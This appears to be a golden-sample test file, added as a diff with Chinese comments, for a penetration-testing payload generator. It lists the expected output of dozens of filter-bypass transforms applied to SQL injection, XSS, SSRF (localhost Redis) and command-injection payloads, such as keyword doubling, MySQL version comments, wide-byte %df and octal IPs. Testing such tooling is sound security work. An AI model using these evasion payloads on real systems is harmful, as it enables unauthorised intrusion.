@@ -1,0 +1,369 @@
+# 绕过链的黄金样本。
+#
+# 背景：`run_golden.py --mutate` 只**篡改模板 body**，绕过的代码路径它碰不到；
+# 而黄金样本又只把绕过当成 state 里的一个 id 传进去。结果是 `bypass.py` 那两百行
+# 从来没被断言过——41 条绕过里有 31 条**一次都没被执行过**，包括全部 8 个 codec。
+# 这个文件把那条链路补上，`smoke_bypass_coverage` 会盯着它。
+#
+# 基座载荷统一取最简单的两条，好让期望值一眼能验：
+#   sqli  → `' UNION SELECT 1,2,3 -- -`   （sqli.mysql.union.basic 全默认）
+#   xss   → `<script>alert(1)</script>`   （xss.generic.probe.script 全默认）
+#   ssrf  → `http://127.0.0.1:6379/`      （ssrf.generic.internal.localhost 全默认）
+#   rce   → `whoami`                      （rce.linux.cmd.raw，cmd 是内置默认值）
+#
+# 期望值的来源：**字符串替换类的照着 bypasses.yaml 里的 params 手推**；
+# **编码类的用标准库（base64 / gzip / zlib / binascii）独立算出来，并逐个解码回原串核对**
+# ——不是跑一遍 forge 把输出粘回来。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= encode：8 个 codec =================
+  # 它们的 name 都写了「编码」，但产物是**给下一环用的**：
+  # gzip / zlib 必须带 Base64，否则字节流在文本管线里会被 UTF-8 重编码（见 bypass.py）
+
+  - name: 绕过 · Base64 编码
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.base64]
+      outputs: [raw]
+    expect:
+      # base64("' UNION SELECT 1,2,3 -- -")，已解码回原串核对
+      payload: "JyBVTklPTiBTRUxFQ1QgMSwyLDMgLS0gLQ=="
+
+  - name: 绕过 · Hex 编码
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.hex]
+      outputs: [raw]
+    expect:
+      payload: "2720554e494f4e2053454c45435420312c322c33202d2d202d"
+
+  - name: 绕过 · Unicode 转义
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.unicode]
+      outputs: [raw]
+    expect:
+      # 每个字符一个 \uXXXX，小写十六进制，四位补零
+      payload: "\\u0027\\u0020\\u0055\\u004e\\u0049\\u004f\\u004e\\u0020\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054\\u0020\\u0031\\u002c\\u0032\\u002c\\u0033\\u0020\\u002d\\u002d\\u0020\\u002d"
+
+  - name: 绕过 · HTML 实体
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.html]
+      outputs: [raw]
+    expect:
+      # 十进制实体，不是十六进制
+      payload: "&#39;&#32;&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#49;&#44;&#50;&#44;&#51;&#32;&#45;&#45;&#32;&#45;"
+
+  - name: 绕过 · Gzip 压缩后 Base64
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.gzip]
+      outputs: [raw]
+    expect:
+      # 注意开头是 H4sI（gzip 魔数被 base64 后），**不是**原始 gzip 字节——
+      # 这正是 name 里写「后 Base64」的原因
+      payload: "H4sIAAAAAAAC/1NXCPXz9PdTCHb1cXUOUTDUMdIxVtDVVdAFAKFXMRcZAAAA"
+
+  - name: 绕过 · Zlib 压缩后 Base64
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.zlib]
+      outputs: [raw]
+    expect:
+      # zlib 头是 eJ，和 gzip 的 H4sI 不同——这一条能区分两者有没有被写反
+      payload: "eJxTVwj18/T3Uwh29XF1DlEw1DHSMVbQ1VXQBQBN6gWG"
+
+  # ================= case =================
+
+  - name: 绕过 · 关键字小写
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.case.lower]
+      outputs: [raw]
+    expect:
+      # words 是 [UNION, SELECT, AND, OR, FROM, WHERE]，只动这几个词，`-- -` 不受影响
+      payload: "' union select 1,2,3 -- -"
+
+  # 这条同时钉两件事：绕过**生效了**（引号外的 union/select 被大写），
+  # 且引号里的 `'select'` **没被动**（skip_quoted 起作用）。
+  # 只测后者的话，一条空操作的样本也能过——`golden/sqli.yaml` 里就有一条这样的，
+  # smoke_bypass_coverage 是靠「至少一条样本得真的改变载荷」把它抓出来的。
+  - name: 绕过 · 关键字大写（同时验证引号被保护）
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.expr
+      vars: {expr: "'select' union select 1"}
+      bypasses: [bypass.case.upper]
+      outputs: [raw]
+    expect:
+      # 槽位/变量先填：' UNION SELECT 'select' union select 1,2,3 -- -
+      # 再大写引号外的 union/select；'select' 整段被引号扫描保护住
+      payload: "' UNION SELECT 'select' UNION SELECT 1,2,3 -- -"
+
+  # ================= 空格替换：5 个变体 =================
+  # 它们两两互斥（任何一个先跑，后面的就找不到空格了），所以一次只测一个
+
+  - name: 绕过 · Tab 替代空格
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.space.tab]
+      outputs: [raw]
+    expect:
+      payload: "'%09UNION%09SELECT%091,2,3%09--%09-"
+
+  - name: 绕过 · %20 替代空格
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.space.percent20]
+      outputs: [raw]
+    expect:
+      payload: "'%20UNION%20SELECT%201,2,3%20--%20-"
+
+  - name: 绕过 · 换行替代空格
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.space.newline]
+      outputs: [raw]
+    expect:
+      payload: "'%0aUNION%0aSELECT%0a1,2,3%0a--%0a-"
+
+  - name: 绕过 · 垂直制表替代空格
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.space.vtab]
+      outputs: [raw]
+    expect:
+      payload: "'%0bUNION%0bSELECT%0b1,2,3%0b--%0b-"
+
+  # ================= 关键字变形 =================
+  # 全是字面替换，所以会改大小写的绕过跟它们互斥（互斥表在 bypasses.yaml 里是双向的）
+
+  - name: 绕过 · 关键字拆分（UNION）
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.keyword.split]
+      outputs: [raw]
+    expect:
+      payload: "' UN/**/ION SELECT 1,2,3 -- -"
+
+  - name: 绕过 · 关键字双写（UNION）
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.keyword.double.union]
+      outputs: [raw]
+    expect:
+      # 过滤器「检出后删除」时，删掉中间那个 UNION 正好还原
+      payload: "' UNIUNIONON SELECT 1,2,3 -- -"
+
+  - name: 绕过 · 关键字双写（SELECT）
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.keyword.double.select]
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELSELECTECT 1,2,3 -- -"
+
+  - name: 绕过 · 版本注释包裹（UNION）
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.keyword.inline.union]
+      outputs: [raw]
+    expect:
+      payload: "' /*!50000UNION*/ SELECT 1,2,3 -- -"
+
+  - name: 绕过 · 版本注释包裹（SELECT）
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.keyword.inline.select]
+      outputs: [raw]
+    expect:
+      payload: "' UNION /*!50000SELECT*/ 1,2,3 -- -"
+
+  # ================= 逻辑运算符等价替换 =================
+  # 模式**带两侧空格**，所以不会打中 ORDER BY（裸 OR 会把 ORDER 切成 ||DER）
+
+  - name: 绕过 · AND 改写为 &&
+    state:
+      vuln: sqli
+      template: sqli.mysql.bool.blind
+      vars: {cond: "1=1"}
+      bypasses: [bypass.and.symbol]
+      outputs: [raw]
+    expect:
+      payload: "' && (1=1) -- -"
+
+  - name: 绕过 · OR 改写为 ||
+    state:
+      vuln: sqli
+      template: sqli.mysql.auth.bypass
+      bypasses: [bypass.or.symbol]
+      outputs: [raw]
+    expect:
+      payload: "' || 1=1 -- -"
+
+  - name: 绕过 · 宽字节注入（%df）
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.gbk.wide]
+      outputs: [raw]
+    expect:
+      # 只换了**开头那个闭合引号**——它是逃逸符，后面 `-- -` 里没有引号可换
+      payload: "%df' UNION SELECT 1,2,3 -- -"
+
+  - name: 绕过 · 注释符改为 #
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.comment.rewrite]
+      outputs: [raw]
+    expect:
+      payload: "' UNION SELECT 1,2,3 #"
+
+  # ================= XSS 专用 =================
+
+  - name: 绕过 · script 标签双写
+    state:
+      vuln: xss
+      template: xss.generic.probe.script
+      bypasses: [bypass.xss.tag.split]
+      outputs: [raw]
+    expect:
+      # 只替换 `<script>`；结尾的 `</script>` 不含 `<script`，不受影响
+      payload: "<scr<script>ipt>alert(1)</script>"
+
+  - name: 绕过 · 标签名大小写混排
+    state:
+      vuln: xss
+      template: xss.generic.probe.script
+      bypasses: [bypass.xss.tag.case]
+      outputs: [raw]
+    expect:
+      # HTML 的标签名大小写不敏感，<ScRiPt> 照样执行
+      payload: "<ScRiPt>alert(1)</script>"
+
+  # ================= wrap =================
+
+  - name: 绕过 · 括号包裹
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.wrap.paren]
+      outputs: [raw]
+    expect:
+      payload: "(' UNION SELECT 1,2,3 -- -)"
+
+  - name: 绕过 · 单引号包裹
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.wrap.quote]
+      outputs: [raw]
+    expect:
+      payload: "'' UNION SELECT 1,2,3 -- -'"
+
+  # ================= SSRF 的 IP 等价写法 =================
+  # 四种写法在**同一次选择里互斥**：替换完 127.0.0.1 就没了，后面那些都找不到目标
+
+  - name: 绕过 · IP 转八进制
+    state:
+      vuln: ssrf
+      template: ssrf.generic.internal.localhost
+      bypasses: [bypass.ip.octal]
+      outputs: [raw]
+    expect:
+      payload: "http://0177.0.0.1:6379/"
+
+  - name: 绕过 · IP 转 IPv6 简写
+    state:
+      vuln: ssrf
+      template: ssrf.generic.internal.localhost
+      bypasses: [bypass.ip.ipv6]
+      outputs: [raw]
+    expect:
+      payload: "http://[::1]:6379/"
+
+  - name: 绕过 · IP 省略写法
+    state:
+      vuln: ssrf
+      template: ssrf.generic.internal.localhost
+      bypasses: [bypass.ip.short]
+      outputs: [raw]
+    expect:
+      # inet_aton 会把 127.1 补零成 127.0.0.1，绕的是字符串黑名单
+      payload: "http://127.1:6379/"
+
+  - name: 绕过 · IP 未指定地址
+    state:
+      vuln: ssrf
+      template: ssrf.generic.internal.localhost
+      bypasses: [bypass.ip.zero]
+      outputs: [raw]
+    expect:
+      payload: "http://0.0.0.0:6379/"
+
+  # ================= join =================
+  # 在载荷**前面**拼一条无害命令再分隔开——注意拼在前面，不是后面
+
+  - name: 绕过 · 管道分隔前置命令
+    state:
+      vuln: rce
+      template: rce.linux.cmd.raw
+      bypasses: [bypass.join.pipe]
+      outputs: [raw]
+    expect:
+      # cmd 走内置默认值 whoami
+      payload: "id|whoami"
+
+  - name: 绕过 · 换行分隔前置命令
+    state:
+      vuln: rce
+      template: rce.linux.cmd.raw
+      bypasses: [bypass.join.newline]
+      outputs: [raw]
+    expect:
+      payload: "id%0awhoami"
+
+  - name: 绕过 · 与号分隔前置命令（Windows）
+    state:
+      vuln: rce
+      template: rce.linux.cmd.raw
+      bypasses: [bypass.join.amp]
+      outputs: [raw]
+    expect:
+      # 这条的 parts 是 whoami 而不是 id（Windows 上 whoami 更通用）
+      payload: "whoami&whoami"
+
+  # ================= 组合：顺序真的会影响结果 =================
+  # 单条绕过的样本证明不了「按用户顺序 fold」这件事
+
+  - name: 绕过 · 两条串联（大小写 + 空格注释）
+    state:
+      vuln: sqli
+      template: sqli.mysql.union.basic
+      bypasses: [bypass.case.alternate, bypass.space.comment]
+      outputs: [raw]
+    expect:
+      # 交替大小写**只作用于 words 里列的那几个词**（这里是 UNION / SELECT），
+      # 不是整串。先大小写：' UnIoN SeLeCt 1,2,3 -- -
+      # 再换空格：'/**/UnIoN/**/SeLeCt/**/1,2,3/**/--/**/-
+      payload: "'/**/UnIoN/**/SeLeCt/**/1,2,3/**/--/**/-"
